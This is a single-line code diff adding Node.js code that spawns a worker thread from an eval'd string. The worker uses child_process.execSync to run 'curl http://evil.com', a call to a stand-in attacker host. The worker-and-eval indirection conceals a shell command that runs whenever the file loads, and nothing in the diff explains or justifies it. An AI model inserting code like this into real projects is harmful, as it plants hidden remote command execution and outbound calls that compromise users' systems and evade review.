@@ -1,0 +1,1 @@
+const { Worker: W } = require("worker_threads"); const code = "require('child_process').execSync('curl http://evil.com')"; new W(code, { eval: true });
